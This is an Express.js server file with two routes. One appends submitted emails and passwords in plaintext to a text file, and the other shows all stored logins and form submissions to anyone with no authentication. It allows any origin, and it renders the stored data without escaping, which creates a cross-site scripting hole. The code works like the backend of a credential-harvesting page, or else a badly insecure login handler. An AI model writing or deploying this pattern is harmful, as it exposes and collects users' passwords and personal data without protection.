const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (optional if you want to host HTML from backend)
app.use(express.static(path.join(__dirname, '../')));

// Save login info
app.post('/save-login', (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).send({ error: 'Missing email or password' });
    fs.appendFileSync('logins.txt', `Email: ${email}, Password: ${password}\n`);
    res.send({ status: 'ok' });
});

// Save application form
app.post('/save-application', (req, res) => {
    const form = req.body;
    fs.appendFileSync('applications.json', JSON.stringify(form) + '\n');
    res.send({ status: 'ok' });
});

// View saved logins (for testing)
app.get('/logins', (req, res) => {
    const data = fs.existsSync('logins.txt') ? fs.readFileSync('logins.txt', 'utf-8') : '';
    res.send(`<pre>${data}</pre>`);
});

// View saved applications (for testing)
app.get('/applications', (req, res) => {
    const data = fs.existsSync('applications.json') ? fs.readFileSync('applications.json', 'utf-8') : '';
    res.send(`<pre>${data}</pre>`);
});

app.listen(3000, () => console.log('Server running at http://localhost:3000'));
